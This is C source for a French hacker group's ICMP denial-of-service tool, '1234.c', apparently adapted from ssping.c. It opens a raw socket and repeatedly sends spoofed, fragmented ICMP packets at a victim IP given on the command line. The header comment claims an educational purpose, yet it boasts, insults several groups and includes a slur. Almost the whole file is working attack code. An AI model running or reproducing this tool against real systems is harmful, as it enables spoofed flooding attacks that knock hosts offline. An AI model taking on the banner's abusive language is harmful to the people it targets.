/* CAMELEON GROUPE PRESENTE 1234.c un denial of service parmit t'en d'autre
 * 
 * ATTENTION: Se denial of service a ete crée pour etude(but educatif) sur l *
 * 'icmp.Il est interdit de s'en servir pour un but de piratage.Le piratage est
 *
 * interdit.Je ne me tien pas responsable de se que vous ferez de se prog.
 *
 * Pour me trouvez 2 solution - faire le n°17 sur son tel ou - m'ecrire à
 *
 * tony@funradio.fr ;) THE SCRIPT CAME.BX sera bientot disponible!
 *
 * I F.O.A.D. BILL GATE , MICROSHIT , LES POULETS , WINDAUBE , FIREBALL ,
 *
 * NEWBIES , LAMES , PD , COWBOYs AND WARLORDs , tous se qui ont pas 
 *
 * cruent en moi , JCzic(tu aurras jamais linux, mais linux te turas).   
 *
 * Merci à: Les operateurs de #funradio, mach..., rewtou, cod4, 
 *
 * ...et tous les autres.  
 *
 * CAMELEON GROUPE F.O.A.D. THE WORLD! VIVE LA FRANCE!
 */

#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/time.h>
#include <sys/socket.h>
#include <netdb.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>

void ottf_banner(void) {
	
   printf("\n1234 1.0 BY CAMELEON G.\n");
   printf("reprise de came.c and ssping.c\n\n");

}

void ottf_usage(const char *progname) {

   printf("ottf_usage :\n");
   printf("%s <spoof adresse> <dst ip> <num>\n",progname);
   printf(" < spoof   > : ip spoof ex: 127.0.0.1\n");
   printf(" < dest    > : ip victim ex:193.252.19.3\n");
   printf(" < number  > : 10\n");
   printf(" Se denial of service rulezzzzzzzzzzz! Non?\n");
   printf(" Se prog à été fait pour l'etude et pas pour s'en servir.\n");
}

int ott_resolve( const char *name, unsigned int port, struct sockaddr_in *addr ) {

   struct hostent *host;

   memset(addr,0,sizeof(struct sockaddr_in));

   addr->sin_family = AF_INET;
   addr->sin_addr.s_addr = inet_addr(name);

   if (addr->sin_addr.s_addr == -1) {
      if (( host = gethostbyname(name) ) == NULL )  {
         fprintf(stderr,"ERROR: Unable to ott_resolve host %s\n",name);
         return(-1);
      }
      addr->sin_family = host->h_addrtype;
      memcpy((caddr_t)&addr->sin_addr,host->h_addr,host->h_length);
   }

   addr->sin_port = htons(port);
   return(0);

}

unsigned short ott_in_cksum(addr, len)
    u_short *addr;
    int len;
{
    register int nleft = len;
    register u_short *w = addr;
    register int sum = 0;
    u_short answer = 0;
 
    /*
     * Our algorithm is simple, using a 32 bit accumulator (sum), we add
     * sequential 16 bit words to it, and at the end, fold back all the
     * carry bits from the top 16 bits into the lower 16 bits.
     */
    while (nleft > 1)  {
        sum += *w++;
        nleft -= 2;
    }
 
    /* mop up an odd byte, if necessary */
    if (nleft == 1) {
        *(u_char *)(&answer) = *(u_char *)w ;
        sum += answer;
    }
 
    /* add back carry outs from top 16 bits to low 16 bits */
    sum = (sum >> 16) + (sum & 0xffff); /* add hi 16 to low 16 */
    sum += (sum >> 16);			/* add carry */
    answer = ~sum;			/* truncate to 16 bits */
    return(answer);
}

int send_winbomb(int socket,
                 unsigned long spoof_addr,
                 struct sockaddr_in *dest_addr) {

   unsigned char  *packet;
   struct iphdr   *ip;
   struct icmphdr *icmp;
   int rc;

        
   packet = (unsigned char *)malloc(sizeof(struct iphdr) +
                        	    sizeof(struct icmphdr) + 8);

   ip = (struct iphdr *)packet;
   icmp = (struct icmphdr *)(packet + sizeof(struct iphdr));

   memset(ip,0,sizeof(struct iphdr) + sizeof(struct icmphdr) + 8);
   
   /* This is the IP header of our packet. */

   ip->ihl      = 5;
   ip->version  = 4;
// ip->tos      = 2;
   ip->id       = htons(1234);
   ip->frag_off |= htons(0x2000);
// ip->tot_len  = 0;
   ip->ttl      = 30;
   ip->protocol = IPPROTO_ICMP;
   ip->saddr    = spoof_addr;
   ip->daddr	= dest_addr->sin_addr.s_addr;
   ip->check    = ott_in_cksum(ip, sizeof(struct iphdr));


   icmp->type     	   = 12;
   icmp->code     	   = 0;
   icmp->checksum 	   = ott_in_cksum(icmp,sizeof(struct icmphdr) + 1);

   if (sendto(socket,
              packet,
              sizeof(struct iphdr) +
              sizeof(struct icmphdr) + 1,0,
              (struct sockaddr *)dest_addr,
              sizeof(struct sockaddr)) == -1) { return(-1); }
   

   ip->tot_len  = htons(sizeof(struct iphdr) + sizeof(struct icmphdr) + 8);
   ip->frag_off = htons(8 >> 3);
   ip->frag_off |= htons(0x2000);
   ip->check    = ott_in_cksum(ip, sizeof(struct iphdr));

   icmp->type = 0;
   icmp->code = 0;
   icmp->checksum = 0;

   if (sendto(socket,
              packet,
              sizeof(struct iphdr) +
              sizeof(struct icmphdr) + 8,0,
              (struct sockaddr *)dest_addr,
              sizeof(struct sockaddr)) == -1) { return(-1); }

   free(packet);
   return(0);

}

int ottf_main(int argc, char * *argv) {

   struct sockaddr_in dest_addr;
   unsigned int i,sock;
   unsigned long src_addr;

   ottf_banner();
   if ((argc != 4)) {
      ottf_usage(argv[0]);
      return(-1);
   }
   
   if((sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) { 
      fprintf(stderr,"ERROR: Opening raw socket.\n");
      return(-1);
   }
   
   if (ott_resolve(argv[1],0,&dest_addr) == -1) { return(-1); }
   src_addr = dest_addr.sin_addr.s_addr;

   if (ott_resolve(argv[2],0,&dest_addr) == -1) { return(-1); }

   printf("%s: J'envoie la sauce! b00m!\n",argv[0]);
   for (i = 0;i < atoi(argv[3]);i++) {
      if (send_winbomb(sock,
                       src_addr,
                       &dest_addr) == -1) {
         fprintf(stderr,"ERROR: faut etre root IDIO.\n");
         return(-1);
      }
      usleep(10000);
   }
}

